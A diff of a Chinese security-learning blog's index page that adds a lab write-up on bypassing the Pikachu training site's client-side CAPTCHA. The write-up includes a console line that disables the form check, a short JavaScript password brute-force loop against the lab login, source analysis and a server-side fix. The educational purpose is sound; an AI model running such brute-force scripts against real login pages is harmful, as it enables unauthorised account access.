@@ -73,6 +73,75 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-Pikachu-验证码绕过-on-client" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/11/04/Pikachu-%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87-on-client/" class="article-date">
+  <time class="dt-published" datetime="2026-11-04T18:40:00.000Z" itemprop="datePublished">2026-11-04</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/">网络渗透</a>►<a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/Pikachu%E5%AE%9E%E9%AA%8C/">Pikachu实验</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2026/11/04/Pikachu-%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87-on-client/">Pikachu 验证码绕过（on client）</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><h3 id="①-验证码可以直接用鼠标选中"><a href="#①-验证码可以直接用鼠标选中" class="headerlink" title="① 验证码可以直接用鼠标选中"></a>① 验证码可以直接用鼠标选中</h3><p>打开页面，那个验证码可以直接用鼠标选中——它是文字，不是图片。它只是一行字符串，机器能直接读出来，起不到防自动化的作用。</p>
+<h3 id="②-先制造一次失败"><a href="#②-先制造一次失败" class="headerlink" title="② 先制造一次失败"></a>② 先制造一次失败</h3><p>验证码框里填 <code>xxxxx</code>（故意填错），用户名 <code>admin</code>，密码 <code>123456</code>，点 Login。</p>
+<img src="/2026/11/04/Pikachu-%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87-on-client/01-client-form-error.png" class="">
+<p><em>图 1　验证码填错，弹出「验证码输入错误！」</em></p>
+<p>页面没有跳转，请求没发出去。</p>
+<h3 id="③-再拆掉拦截"><a href="#③-再拆掉拦截" class="headerlink" title="③ 再拆掉拦截"></a>③ 再拆掉拦截</h3><p>在 Console 里执行：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;bf_client&#x27;</span>).<span class="property">onsubmit</span> = <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/11/04/Pikachu-%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87-on-client/02-bypass-success.png" class="">
+<p><em>图 2　拦截面被拆掉，页面跳转并显示 login success</em></p>
+<p>页面跳转，显示 login success。</p>
+<h3 id="④-爆破"><a href="#④-爆破" class="headerlink" title="④ 爆破"></a>④ 爆破</h3><p>服务器不校验验证码，所以可以完全不提交 <code>vcode</code> 字段，直接连发：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(<span class="title function_">async</span> () =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> list = [<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;000000&#x27;</span>,<span class="string">&#x27;abc123&#x27;</span>,<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;password&#x27;</span>,<span class="string">&#x27;12345678&#x27;</span>,<span class="string">&#x27;qwerty&#x27;</span>,<span class="string">&#x27;111111&#x27;</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; list.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> r = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;bf_client.php&#x27;</span>, &#123;</span><br><span class="line">      <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">      <span class="attr">headers</span>: &#123;<span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;,</span><br><span class="line">      <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;<span class="attr">username</span>:<span class="string">&#x27;admin&#x27;</span>, <span class="attr">password</span>:list[i], <span class="attr">submit</span>:<span class="string">&#x27;Login&#x27;</span>&#125;)</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">const</span> t = <span class="keyword">await</span> r.<span class="title function_">text</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;第&#x27;</span>+(i+<span class="number">1</span>)+<span class="string">&#x27;次  &#x27;</span> + list[i] + <span class="string">&#x27;  →  &#x27;</span> + (t.<span class="title function_">includes</span>(<span class="string">&#x27;login success&#x27;</span>) ? <span class="string">&#x27;✓ 正确&#x27;</span> : <span class="string">&#x27;✗ 密码错&#x27;</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/11/04/Pikachu-%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87-on-client/03-console-bruteforce.png" class="">
+<p><em>图 3　8 次请求连发，第 1 次 <code>123456</code> 就命中</em></p>
+<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><h3 id="①-验证码由-JS-现场随机生成，明文写进页面那个只读输入框"><a href="#①-验证码由-JS-现场随机生成，明文写进页面那个只读输入框" class="headerlink" title="① 验证码由 JS 现场随机生成，明文写进页面那个只读输入框"></a>① 验证码由 JS 现场随机生成，明文写进页面那个只读输入框</h3><img src="/2026/11/04/Pikachu-%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87-on-client/04-createcode-js.png" class="">
+<p><em>图 4　<code>createCode()</code>：随机取 5 位字符，直接赋给输入框的 value</em></p>
+<h3 id="②-比较发生在浏览器里，不是在服务器上"><a href="#②-比较发生在浏览器里，不是在服务器上" class="headerlink" title="② 比较发生在浏览器里，不是在服务器上"></a>② 比较发生在浏览器里，不是在服务器上</h3><img src="/2026/11/04/Pikachu-%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87-on-client/05-validate-js.png" class="">
+<p><em>图 5　<code>validate()</code>：拿输入框的值和变量 <code>code</code> 比对，决定是否放行</em></p>
+<h3 id="③-PHP-只读-username-和-password"><a href="#③-PHP-只读-username-和-password" class="headerlink" title="③ PHP 只读 username 和 password"></a>③ PHP 只读 username 和 password</h3><p>整个 PHP 文件里没有出现过 <code>$_POST[&#39;vcode&#39;]</code>。</p>
+<img src="/2026/11/04/Pikachu-%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87-on-client/06-php-no-vcode.png" class="">
+<p><em>图 6　<code>bf_client.php</code> 只取 <code>username</code> 和 <code>password</code></em></p>
+<p><strong>结论</strong>：HTML 和 JS 是发给浏览器的，浏览器在攻击者手里，攻击者可以任意篡改。</p>
+<h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><p>服务端自己生成验证码、存 Session、自己比对、比完销毁。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://shu278.github.io/2026/11/04/Pikachu-%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87-on-client/" data-id="cuid4DKXUyjaeT_QV3wqw36Zv" data-title="Pikachu 验证码绕过（on client）" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pikachu/" rel="tag">Pikachu</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%AA%8C%E8%AF%81/" rel="tag">客户端验证</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" rel="tag">暴力破解</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%AA%8C%E8%AF%81%E7%A0%81/" rel="tag">验证码</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-Pikachu-验证码绕过-on-server" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2026/11/04/Pikachu-%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87-on-server/" class="article-date">
@@ -144,7 +213,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://shu278.github.io/2026/11/04/Pikachu-%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87-on-server/" data-id="cuid9kAPpzMYBD96jVmZj4-F_" data-title="Pikachu 验证码绕过（on server）" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="https://shu278.github.io/2026/11/04/Pikachu-%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87-on-server/" data-id="cuidB80B5S3DuJSd5t1j7CkoZ" data-title="Pikachu 验证码绕过（on server）" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -161,7 +230,7 @@
     <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2026/11/04/hello-world/" class="article-date">
-  <time class="dt-published" datetime="2026-11-04T09:54:39.856Z" itemprop="datePublished">2026-11-04</time>
+  <time class="dt-published" datetime="2026-11-04T10:41:43.195Z" itemprop="datePublished">2026-11-04</time>
 </a>
     
   <div class="article-category">
@@ -201,7 +270,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://shu278.github.io/2026/11/04/hello-world/" data-id="cuidzzeYb3v-_KM8URp5g3s5X" data-title="Hello World" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="https://shu278.github.io/2026/11/04/hello-world/" data-id="cuid25rdAuihY1Mn5X2Z-CX0H" data-title="Hello World" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -323,7 +392,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://shu278.github.io/2026/11/02/vsftpd-%E7%AC%91%E8%84%B8%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8BPoC/" data-id="cuidqDejYXuxG8TSSp2t3lBVq" data-title="vsftpd 2.3.4「笑脸漏洞」检测 PoC" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="https://shu278.github.io/2026/11/02/vsftpd-%E7%AC%91%E8%84%B8%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8BPoC/" data-id="cuidlB0b1z3wgNANKO4CPqLw4" data-title="vsftpd 2.3.4「笑脸漏洞」检测 PoC" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -479,7 +548,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://shu278.github.io/2026/11/02/curl-%E4%BA%B2%E6%89%8B%E6%8B%86%E5%BC%80%E4%B8%80%E6%AC%A1HTTP%E8%AF%B7%E6%B1%82/" data-id="cuidwp8NXWb3phGKgJzOEJyLP" data-title="用 curl 亲手拆开一次 HTTP 请求" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="https://shu278.github.io/2026/11/02/curl-%E4%BA%B2%E6%89%8B%E6%8B%86%E5%BC%80%E4%B8%80%E6%AC%A1HTTP%E8%AF%B7%E6%B1%82/" data-id="cuidJGaNViqQ5raaZUPbRvlvK" data-title="用 curl 亲手拆开一次 HTTP 请求" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -616,7 +685,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://shu278.github.io/2026/10/26/%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8F-%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E4%B8%8E%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86/" data-id="cuidv8etFuV9ZoTA1gVLuIbdx" data-title="被动扫描：网络空间搜索引擎与子域名收集" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="https://shu278.github.io/2026/10/26/%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8F-%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E4%B8%8E%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86/" data-id="cuid8mU4eBmed2HPeVwpDWsv_" data-title="被动扫描：网络空间搜索引擎与子域名收集" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -792,7 +861,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://shu278.github.io/2026/10/19/QQ%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" data-id="cuidMyBdxpGu_iXMWt9ahKNHv" data-title="QQ 流量分析" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="https://shu278.github.io/2026/10/19/QQ%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" data-id="cuidQTm4x3t3qVrQRT6pEBsmM" data-title="QQ 流量分析" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -844,7 +913,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://shu278.github.io/2026/09/26/%E7%AD%89%E4%BF%9D2-0%EF%BC%9A%E4%BB%8E%E2%80%9C%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E2%80%9D%E5%88%B0%E2%80%9C%E5%AE%89%E5%85%A8%E7%94%9F%E6%80%81%E2%80%9D/" data-id="cuidlwSg-lS3NCSprmsm7sHo-" data-title="等保2.0：从“系统安全”到“安全生态”" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="https://shu278.github.io/2026/09/26/%E7%AD%89%E4%BF%9D2-0%EF%BC%9A%E4%BB%8E%E2%80%9C%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E2%80%9D%E5%88%B0%E2%80%9C%E5%AE%89%E5%85%A8%E7%94%9F%E6%80%81%E2%80%9D/" data-id="cuidnhxAT6_RfMR-uxL0U_ugV" data-title="等保2.0：从“系统安全”到“安全生态”" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -878,7 +947,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">标签</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTP/" rel="tag">HTTP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hexo/" rel="tag">Hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kali/" rel="tag">Kali</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Metasploit/" rel="tag">Metasploit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Nmap/" rel="tag">Nmap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/OSINT/" rel="tag">OSINT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pikachu/" rel="tag">Pikachu</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/QQ/" rel="tag">QQ</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Session/" rel="tag">Session</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Wireshark/" rel="tag">Wireshark</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ZoomEye/" rel="tag">ZoomEye</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/curl/" rel="tag">curl</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vsftpd/" rel="tag">vsftpd</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%B8%BB%E5%8A%A8%E6%89%AB%E6%8F%8F/" rel="tag">主动扫描</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%90%E5%9F%9F%E5%90%8D/" rel="tag">子域名</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8A%93%E5%8C%85/" rel="tag">抓包</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" rel="tag">暴力破解</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" rel="tag">流量分析</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B5%8B%E8%AF%95/" rel="tag">测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/" rel="tag">漏洞扫描</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AD%89%E4%BF%9D2-0/" rel="tag">等保2.0</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8F/" rel="tag">被动扫描</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%AA%8C%E8%AF%81%E7%A0%81/" rel="tag">验证码</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTP/" rel="tag">HTTP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hexo/" rel="tag">Hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kali/" rel="tag">Kali</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Metasploit/" rel="tag">Metasploit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Nmap/" rel="tag">Nmap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/OSINT/" rel="tag">OSINT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pikachu/" rel="tag">Pikachu</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/QQ/" rel="tag">QQ</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Session/" rel="tag">Session</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Wireshark/" rel="tag">Wireshark</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ZoomEye/" rel="tag">ZoomEye</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/curl/" rel="tag">curl</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vsftpd/" rel="tag">vsftpd</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%B8%BB%E5%8A%A8%E6%89%AB%E6%8F%8F/" rel="tag">主动扫描</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%90%E5%9F%9F%E5%90%8D/" rel="tag">子域名</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%AA%8C%E8%AF%81/" rel="tag">客户端验证</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8A%93%E5%8C%85/" rel="tag">抓包</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" rel="tag">暴力破解</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" rel="tag">流量分析</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B5%8B%E8%AF%95/" rel="tag">测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/" rel="tag">漏洞扫描</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AD%89%E4%BF%9D2-0/" rel="tag">等保2.0</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8F/" rel="tag">被动扫描</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%AA%8C%E8%AF%81%E7%A0%81/" rel="tag">验证码</a></li></ul>
     </div>
   </div>
 
@@ -888,7 +957,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">标签云</h3>
     <div class="widget tagcloud">
-      <a href="/tags/HTTP/" style="font-size: 10px;">HTTP</a> <a href="/tags/Hexo/" style="font-size: 10px;">Hexo</a> <a href="/tags/Kali/" style="font-size: 10px;">Kali</a> <a href="/tags/Metasploit/" style="font-size: 10px;">Metasploit</a> <a href="/tags/Nmap/" style="font-size: 10px;">Nmap</a> <a href="/tags/OSINT/" style="font-size: 10px;">OSINT</a> <a href="/tags/Pikachu/" style="font-size: 10px;">Pikachu</a> <a href="/tags/QQ/" style="font-size: 10px;">QQ</a> <a href="/tags/Session/" style="font-size: 10px;">Session</a> <a href="/tags/Wireshark/" style="font-size: 10px;">Wireshark</a> <a href="/tags/ZoomEye/" style="font-size: 10px;">ZoomEye</a> <a href="/tags/curl/" style="font-size: 10px;">curl</a> <a href="/tags/vsftpd/" style="font-size: 10px;">vsftpd</a> <a href="/tags/%E4%B8%BB%E5%8A%A8%E6%89%AB%E6%8F%8F/" style="font-size: 10px;">主动扫描</a> <a href="/tags/%E5%AD%90%E5%9F%9F%E5%90%8D/" style="font-size: 10px;">子域名</a> <a href="/tags/%E6%8A%93%E5%8C%85/" style="font-size: 10px;">抓包</a> <a href="/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" style="font-size: 10px;">暴力破解</a> <a href="/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" style="font-size: 10px;">流量分析</a> <a href="/tags/%E6%B5%8B%E8%AF%95/" style="font-size: 10px;">测试</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/" style="font-size: 10px;">漏洞扫描</a> <a href="/tags/%E7%AD%89%E4%BF%9D2-0/" style="font-size: 10px;">等保2.0</a> <a href="/tags/%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8F/" style="font-size: 10px;">被动扫描</a> <a href="/tags/%E9%AA%8C%E8%AF%81%E7%A0%81/" style="font-size: 10px;">验证码</a>
+      <a href="/tags/HTTP/" style="font-size: 10px;">HTTP</a> <a href="/tags/Hexo/" style="font-size: 10px;">Hexo</a> <a href="/tags/Kali/" style="font-size: 10px;">Kali</a> <a href="/tags/Metasploit/" style="font-size: 10px;">Metasploit</a> <a href="/tags/Nmap/" style="font-size: 10px;">Nmap</a> <a href="/tags/OSINT/" style="font-size: 10px;">OSINT</a> <a href="/tags/Pikachu/" style="font-size: 20px;">Pikachu</a> <a href="/tags/QQ/" style="font-size: 10px;">QQ</a> <a href="/tags/Session/" style="font-size: 10px;">Session</a> <a href="/tags/Wireshark/" style="font-size: 10px;">Wireshark</a> <a href="/tags/ZoomEye/" style="font-size: 10px;">ZoomEye</a> <a href="/tags/curl/" style="font-size: 10px;">curl</a> <a href="/tags/vsftpd/" style="font-size: 10px;">vsftpd</a> <a href="/tags/%E4%B8%BB%E5%8A%A8%E6%89%AB%E6%8F%8F/" style="font-size: 10px;">主动扫描</a> <a href="/tags/%E5%AD%90%E5%9F%9F%E5%90%8D/" style="font-size: 10px;">子域名</a> <a href="/tags/%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%AA%8C%E8%AF%81/" style="font-size: 10px;">客户端验证</a> <a href="/tags/%E6%8A%93%E5%8C%85/" style="font-size: 10px;">抓包</a> <a href="/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" style="font-size: 20px;">暴力破解</a> <a href="/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" style="font-size: 10px;">流量分析</a> <a href="/tags/%E6%B5%8B%E8%AF%95/" style="font-size: 10px;">测试</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/" style="font-size: 10px;">漏洞扫描</a> <a href="/tags/%E7%AD%89%E4%BF%9D2-0/" style="font-size: 10px;">等保2.0</a> <a href="/tags/%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8F/" style="font-size: 10px;">被动扫描</a> <a href="/tags/%E9%AA%8C%E8%AF%81%E7%A0%81/" style="font-size: 20px;">验证码</a>
     </div>
   </div>
 
@@ -910,6 +979,10 @@
       <ul>
         
           <li>
+            <a href="/2026/11/04/Pikachu-%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87-on-client/">Pikachu 验证码绕过（on client）</a>
+          </li>
+        
+          <li>
             <a href="/2026/11/04/Pikachu-%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87-on-server/">Pikachu 验证码绕过（on server）</a>
           </li>
         
@@ -923,10 +996,6 @@
         
           <li>
             <a href="/2026/11/02/curl-%E4%BA%B2%E6%89%8B%E6%8B%86%E5%BC%80%E4%B8%80%E6%AC%A1HTTP%E8%AF%B7%E6%B1%82/">用 curl 亲手拆开一次 HTTP 请求</a>
-          </li>
-        
-          <li>
-            <a href="/2026/10/26/%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8F-%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E4%B8%8E%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86/">被动扫描：网络空间搜索引擎与子域名收集</a>
           </li>
         
       </ul>
